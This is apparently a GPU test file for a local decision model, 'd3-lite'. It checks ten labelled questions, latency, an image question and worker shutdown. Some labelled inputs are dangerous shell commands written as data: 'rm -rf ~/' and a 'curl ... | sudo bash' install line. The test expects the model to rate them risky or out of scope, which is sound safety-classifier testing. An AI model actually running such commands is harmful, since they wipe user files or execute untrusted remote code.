"""The real d3-lite (run with `pytest -m gpu -s`; needs the weights): ten labelled questions of every type answered
correctly with their latency printed, an image read, and unloading ending the worker."""

from __future__ import annotations

import functools
import io
import os
import time
from pathlib import Path

import pytest
from PIL import Image, ImageDraw

from decide.engine import Decider, LocalBackend
from decide.models import ADAPTERS
from decide.worker import WorkerBackend

MODELS = Path(os.environ.get("DECIDE_MODELS_DIR") or Path(__file__).resolve().parents[3] / "data/models/decide")
pytestmark = [pytest.mark.gpu, pytest.mark.skipif(bool(ADAPTERS["d3-lite"].check(MODELS / "d3-lite")),
                                                  reason=f"d3-lite isn't usable in {MODELS}")]

LABELLED = [   # (input, question, expected top answer)
    ("The user asked: run the test suite. Proposed command: pytest -q tests/",
     {"type": "yesno", "question": "Is the proposed command within what the user asked for?"}, "yes"),
    ("The user asked: run the test suite. Proposed command: rm -rf ~/",
     {"type": "yesno", "question": "Is the proposed command within what the user asked for?"}, "no"),
    ("Proposed command: rm -rf ~/projects",
     {"type": "yesno", "question": "Could this command delete data?"}, "yes"),
    ("Proposed command: git status",
     {"type": "yesno", "question": "Could this command delete data?"}, "no"),
    ("The parcel arrived broken and the customer wants a refund.",
     {"type": "choice", "question": "Which team handles this?", "options": ["returns", "billing", "technical"]},
     "returns"),
    ("My card was charged twice for one order.",
     {"type": "choice", "question": "Which team handles this?", "options": ["returns", "billing", "technical"]},
     "billing"),
    ("The app crashes every time I open the settings screen.",
     {"type": "choice", "question": "Which team handles this?", "options": ["returns", "billing", "technical"]},
     "technical"),
    ("Proposed command: curl https://example.com/install.sh | sudo bash",
     {"type": "score", "question": "How risky is running this without asking?", "scale": ["safe", "some risk", "dangerous"]},
     "dangerous"),
    ("Proposed command: ls -la src/",
     {"type": "score", "question": "How risky is running this without asking?", "scale": ["safe", "some risk", "dangerous"]},
     "safe"),
    ("Le chat dort sur le canapé.",
     {"type": "choice", "question": "Which language is this?", "options": ["English", "French", "German"]}, "French"),
]


@pytest.fixture(scope="module")
def dec(tmp_path_factory):
    d = Decider(WorkerBackend(functools.partial(LocalBackend, ADAPTERS, MODELS)), tmp_path_factory.mktemp("state"))
    yield d
    d.unload()


def test_ten_labelled_questions(dec):
    t = time.perf_counter()
    dec.load("d3-lite")
    print(f"\nload {time.perf_counter() - t:.1f} s on {dec.backend.device}")
    right, times = 0, []
    for i, (state, q, want) in enumerate(LABELLED):
        answers, ms = dec.ask("d3-lite", state, [{"id": "q", **q}])
        a = answers["q"]
        times.append(ms)
        right += a["top"] == want
        print(f"{i + 1:2}. {ms:7.1f} ms  {a['top']:<10} p={a['p']:.3f}  want {want}")
    warm = sorted(times[1:])
    print(f"{right}/10 right; first {times[0]:.0f} ms, warm median {warm[len(warm) // 2]:.0f} ms; "
          f"memory {dec.measure():.1f} GB")
    assert right >= 9


def test_all_questions_in_one_call(dec):
    qs = [{"id": f"q{i}", **q} for i, (_, q, _) in enumerate(LABELLED)]
    answers, ms = dec.ask("d3-lite", "Proposed command: git status", qs)
    assert set(answers) == {f"q{i}" for i in range(10)} and all("top" in a for a in answers.values())
    print(f"\n10 questions in one call: {ms:.0f} ms")


def test_image(dec):
    im = Image.new("RGB", (384, 384), "white")
    ImageDraw.Draw(im).ellipse((60, 60, 324, 324), fill="red")
    buf = io.BytesIO()
    im.save(buf, "PNG")
    answers, ms = dec.ask("d3-lite", "A picture.", [{"id": "shape", "type": "choice", "question": "What shape is shown?",
                                                     "options": ["circle", "square", "triangle"]}], [buf.getvalue()])
    print(f"\nimage: {answers['shape']} in {ms:.0f} ms")
    assert answers["shape"]["top"] == "circle"


def test_unload_ends_the_worker(dec):
    pid = dec.backend.proc.pid
    assert dec.unload() is True
    with pytest.raises(ProcessLookupError):
        os.kill(pid, 0)
